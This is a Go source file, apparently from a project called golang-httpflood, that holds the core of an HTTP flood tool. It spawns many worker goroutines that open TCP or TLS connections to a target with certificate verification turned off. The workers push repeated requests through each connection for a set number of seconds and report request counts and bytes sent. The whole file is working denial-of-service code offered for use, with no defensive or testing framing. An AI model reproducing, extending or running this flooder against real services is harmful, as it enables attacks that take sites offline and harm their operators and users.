package flood

import (
	"crypto/tls"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/bonbonbon1414/golang-httpflood/internal/config"
	"github.com/bonbonbon1414/golang-httpflood/internal/stats"
)

// Flood manages the HTTP flooding operation
type Flood struct {
	config       *config.Config
	metrics      *stats.Metrics
	requestBuilder *RequestBuilder
	headers      string
	postData     string
	startChan    chan bool
	stopChan     chan bool
	wg           sync.WaitGroup
}

// NewFlood creates a new flood operation
func NewFlood(cfg *config.Config, metrics *stats.Metrics, headers string, postData string) *Flood {
	return &Flood{
		config:          cfg,
		metrics:         metrics,
		requestBuilder:  NewRequestBuilder(cfg),
		headers:         headers,
		postData:        postData,
		startChan:       make(chan bool),
		stopChan:        make(chan bool),
	}
}

// Start begins the flood operation
func (f *Flood) Start() {
	// Spawn worker goroutines
	for i := 0; i < f.config.Threads; i++ {
		f.wg.Add(1)
		go f.worker()
		time.Sleep(time.Microsecond * 100)
		fmt.Printf("\rThreads [%d] are ready", i+1)
	}
	fmt.Println()
}

// WaitForStart waits for the start signal
func (f *Flood) WaitForStart() {
	<-f.startChan
}

// SignalStart sends the start signal
func (f *Flood) SignalStart() {
	close(f.startChan)
}

// Stop stops the flood operation
func (f *Flood) Stop() {
	close(f.stopChan)
	f.wg.Wait()
}

// worker is the main worker goroutine that sends requests
func (f *Flood) worker() {
	defer f.wg.Done()
	
	<-f.startChan // Wait for start signal
	
	for {
		select {
		case <-f.stopChan:
			return
		default:
			f.sendBurst()
		}
	}
}

// sendBurst sends a burst of requests through a single connection
func (f *Flood) sendBurst() {
	var conn net.Conn
	var err error
	
	// Establish connection
	conn, err = f.dial()
	if err != nil {
		fmt.Println("Connection Error:", err)
		time.Sleep(time.Second)
		return
	}
	f.metrics.IncrementConnections()
	
	// Send requests through this connection
	for i := 0; i < f.config.RequestsPerConnection; i++ {
		select {
		case <-f.stopChan:
			conn.Close()
			f.metrics.DecrementConnections()
			return
		default:
			f.sendRequest(conn)
		}
	}
	
	conn.Close()
	f.metrics.DecrementConnections()
}

// dial establishes a TCP/TLS connection
func (f *Flood) dial() (net.Conn, error) {
	addr := f.config.GetAddress()
	
	if f.config.UseHTTPS {
		cfg := &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         f.config.Host,
		}
		return tls.Dial("tcp", addr, cfg)
	}
	return net.Dial("tcp", addr)
}

// sendRequest sends a single HTTP request
func (f *Flood) sendRequest(conn net.Conn) {
	startTime := time.Now()
	
	request, err := f.requestBuilder.BuildRequest(f.headers, f.postData)
	if err != nil {
		f.metrics.IncrementFailure()
		return
	}
	
	_, err = conn.Write([]byte(request))
	if err != nil {
		f.metrics.IncrementFailure()
		return
	}
	
	// Update metrics
	f.metrics.IncrementRequests()
	f.metrics.IncrementSuccess()
	f.metrics.AddBytesSent(uint64(len(request)))
	
	elapsed := time.Since(startTime)
	f.metrics.RecordResponseTime(uint64(elapsed.Milliseconds()))
}

// Run executes the complete flood operation
func (f *Flood) Run(duration int) {
	// Start statistics display
	stopDisplay := f.metrics.StartDisplay(time.Second * 5)
	defer close(stopDisplay)
	
	// Start workers
	f.Start()
	
	// Wait for user confirmation
	fmt.Println("Press [Enter] to continue...")
	var input string
	fmt.Scanln(&input)
	
	// Signal workers to start
	fmt.Printf("Flood will end in %d seconds.\n", duration)
	f.SignalStart()
	
	// Run for specified duration
	time.Sleep(time.Duration(duration) * time.Second)
	
	// Stop the flood
	f.Stop()
}